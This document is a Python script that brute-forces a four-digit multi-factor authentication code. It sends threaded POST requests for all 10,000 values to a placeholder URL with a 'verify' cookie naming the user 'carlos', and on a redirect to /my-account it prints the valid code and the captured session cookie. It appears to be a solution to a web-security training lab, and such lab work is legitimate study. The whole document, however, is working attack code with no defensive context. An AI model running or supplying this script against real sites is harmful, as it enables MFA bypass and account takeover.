#!/usr/bin/env python3
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://urlishere.com"
WORKERS = 25

thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session

def try_code(number):
    code = f"{number:04d}"
    session = get_session()

    response = session.post(
        URL,
        cookies={"verify": "carlos"},
        data={"mfa-code": code},
        allow_redirects=False,
        timeout=10
    )

    location = response.headers.get("Location", "")

    if response.status_code in (302, 303) and "/my-account" in location:
        session_id = response.cookies.get("session") or session.cookies.get("session")
        return code, location, session_id, response.headers.get("Set-Cookie", "")

    return None


with ThreadPoolExecutor(max_workers=WORKERS) as executor:
    for start in range(0, 10000, WORKERS):
        futures = [
            executor.submit(try_code, number)
            for number in range(start, min(start + WORKERS, 10000))
        ]

        for future in as_completed(futures):
            result = future.result()

            if result:
                code, location, session_id, set_cookie = result

                print(f"\n[+] Valid MFA code: {code}")
                print(f"[+] Redirect: {location}")
                print(f"[+] Session ID: {session_id}")
                print(f"[+] Set-Cookie: {set_cookie}")
                raise SystemExit

print("[-] No valid code found.")
